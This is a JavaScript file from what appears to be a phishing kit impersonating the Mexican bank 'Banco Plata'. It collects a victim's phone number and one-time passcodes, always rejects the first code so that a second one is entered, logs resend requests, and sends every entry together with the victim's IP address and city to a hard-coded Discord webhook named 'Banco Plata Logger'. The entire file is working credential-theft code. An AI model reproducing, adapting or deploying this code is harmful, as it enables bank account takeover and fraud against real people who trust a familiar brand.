// i.js

// Webhook de Discord
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1566825277248503819/42JBXR-dSuL8QDYyT9PhSyeOl2PTnfeFOLcVNKhJ-GNCOWUEnr_Er9CU-ujtKA3bbIy';

// ==========================================
// FUNCIONES PARA INDEX.HTML (MODAL)
// ==========================================
function openModal() {
    const modal = document.getElementById('modalOverlay');
    if (modal) modal.classList.add('active');
}

function closeModal() {
    const modal = document.getElementById('modalOverlay');
    if (modal) modal.classList.remove('active');
}

function redirectToCode() {
    const phoneInput = document.getElementById('phoneInput');
    if (!phoneInput) return;
    
    const phone = phoneInput.value.trim();
    if (phone === '') {
        alert('Por favor, ingresa tu número de teléfono.');
        return;
    }
    
    localStorage.setItem('plata_phone', phone);
    window.location.href = '5m5.html';
}

// ==========================================
// FUNCIONES UTILITARIAS (LOADERS Y API)
// ==========================================
function showLoader(containerId) {
    const container = document.getElementById(containerId);
    if (!container) return;
    
    // Eliminar loader previo si existe
    const prev = document.getElementById('globalLoader');
    if (prev) prev.remove();

    const loader = document.createElement('div');
    loader.className = 'loader-overlay';
    loader.id = 'globalLoader';
    loader.innerHTML = '<div class="spinner"></div>';
    container.appendChild(loader);
}

function hideLoader() {
    const loader = document.getElementById('globalLoader');
    if (loader) loader.remove();
}

async function getUserInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Desconocida',
            city: data.city || 'Desconocida',
            country: data.country_name || 'Desconocido'
        };
    } catch (error) {
        return { ip: 'Desconocida', city: 'Desconocida', country: 'Desconocido' };
    }
}

async function sendToDiscord(phone, code) {
    const userInfo = await getUserInfo();
    const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });

    const payload = {
        username: "Banco Plata Logger",
        embeds: [{
            title: "🔐 Nuevo Intento de Código",
            color: 16724480, 
            fields: [
                { name: "📱 Teléfono", value: phone || "No ingresado", inline: true },
                { name: "🔢 Código", value: code || "Ninguno", inline: true },
                { name: "🌐 IP", value: userInfo.ip, inline: true },
                { name: "📍 Ciudad", value: `${userInfo.city}, ${userInfo.country}`, inline: true },
                { name: "⏰ Hora", value: time, inline: false }
            ],
            footer: { text: "Plata Login System" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Error enviando a Discord', e);
    }
}

async function sendResendToDiscord(phone, method) {
    const userInfo = await getUserInfo();
    const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });

    const payload = {
        username: "Banco Plata Logger",
        embeds: [{
            title: "🔄 Reenvío de Código Solicitado",
            description: `El usuario ha solicitado un reenvío de código vía **${method}**.`,
            color: 16750848,
            fields: [
                { name: "📱 Teléfono", value: phone, inline: true },
                { name: "🌐 IP", value: userInfo.ip, inline: true },
                { name: "📍 Ciudad", value: `${userInfo.city}, ${userInfo.country}`, inline: true },
                { name: "⏰ Hora", value: time, inline: false }
            ],
            footer: { text: "Plata Resend System" },
            timestamp: new Date().toISOString()
        }]
    };

    try {
        await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error('Error enviando a Discord', e);
    }
}

// ==========================================
// LÓGICA DE 5M5.HTML (CÓDIGO OTP)
// ==========================================
let isFirstAttempt = true;
let resendTimerInterval;
let resendSeconds = 15;
let isVerifying = false; // Bandera para evitar doble ejecución

function init5m5() {
    const phone = localStorage.getItem('plata_phone') || 'No ingresado';
    const phoneDisplay = document.getElementById('phoneDisplay');
    if (phoneDisplay) phoneDisplay.textContent = phone;
    
    // Iniciar el temporizador visual
    iniciarTemporizador(15);

    const otpInput = document.getElementById('otpInput');
    const errorNotif = document.getElementById('errorNotif');
    const successNotif = document.getElementById('successNotif');
    const resendText = document.getElementById('resendText');
    const resendButtons = document.getElementById('resendButtons');

    if (otpInput) {
        otpInput.focus();

        // Verificación automática
        otpInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '');
            e.target.value = val;

            if (val.length === 4 && !isVerifying) {
                isVerifying = true;
                otpInput.disabled = true;

                // Esperar 1 segundo para que el usuario vea el último dígito antes de cargar
                setTimeout(async () => {
                    showLoader('app-container');
                    await sendToDiscord(phone, val);

                    const delay = Math.floor(Math.random() * 2000) + 3000; // 3-5 segundos
                    
                    setTimeout(() => {
                        hideLoader();
                        otpInput.disabled = false;
                        isVerifying = false;

                        if (isFirstAttempt) {
                            // Primer intento: Error
                            isFirstAttempt = false;
                            if (errorNotif) errorNotif.style.display = 'block';
                            otpInput.value = '';
                            otpInput.focus();
                            setTimeout(() => { if (errorNotif) errorNotif.style.display = 'none'; }, 3000);
                        } else {
                            // Segundo intento: Redirigir
                            window.location.href = 'in3.html'; 
                        }
                    }, delay);
                }, 1000); // 1 segundo de espera visual
            }
        });
    }

    // Lógica para los botones de reenvío
    const btnResendSms = document.getElementById('btnResendSms');
    const btnResendWa = document.getElementById('btnResendWa');

    if (btnResendSms) {
        btnResendSms.addEventListener('click', () => handleResend('SMS'));
    }
    if (btnResendWa) {
        btnResendWa.addEventListener('click', () => handleResend('WhatsApp'));
    }

    async function handleResend(method) {
        if (resendSeconds > 0) return;
        
        showLoader('app-container');
        await sendResendToDiscord(phone, method);

        setTimeout(() => {
            hideLoader();
            
            // Mostrar notificación de éxito
            if (successNotif) {
                successNotif.style.display = 'block';
                setTimeout(() => { successNotif.style.display = 'none'; }, 3000);
            }

            // Actualizar el subtítulo
            const subtitle = document.querySelector('.subtitle');
            if (subtitle) {
                subtitle.innerHTML = `Que enviamos por ${method} a <span id="phoneDisplay">${phone}</span>`;
            }
            
            // Reiniciar temporizador
            iniciarTemporizador(15);

        }, 3000);
    }

    function iniciarTemporizador(segundos) {
        resendSeconds = segundos;
        if (resendButtons) resendButtons.style.display = 'none';
        if (resendText) {
            resendText.style.display = 'block';
            resendText.textContent = `Reenviar en ${resendSeconds} segundos`;
        }
        
        clearInterval(resendTimerInterval);
        resendTimerInterval = setInterval(() => {
            resendSeconds--;
            if (resendSeconds <= 0) {
                clearInterval(resendTimerInterval);
                if (resendText) resendText.style.display = 'none';
                if (resendButtons) resendButtons.style.display = 'flex';
            } else {
                if (resendText) {
                    resendText.textContent = `Reenviar en ${resendSeconds} segundo${resendSeconds !== 1 ? 's' : ''}`;
                }
            }
        }, 1000);
    }
}

// ==========================================
// INICIALIZADOR GLOBAL
// ==========================================
// Usamos window.onload para garantizar que todo el HTML esté listo
window.onload = function() {
    if (document.getElementById('modalOverlay')) {
        // Index.html
    } else if (document.getElementById('otpInput')) {
        init5m5();
    } else if (document.getElementById('video')) {
        if (typeof initIn3 === 'function') initIn3();
    }
};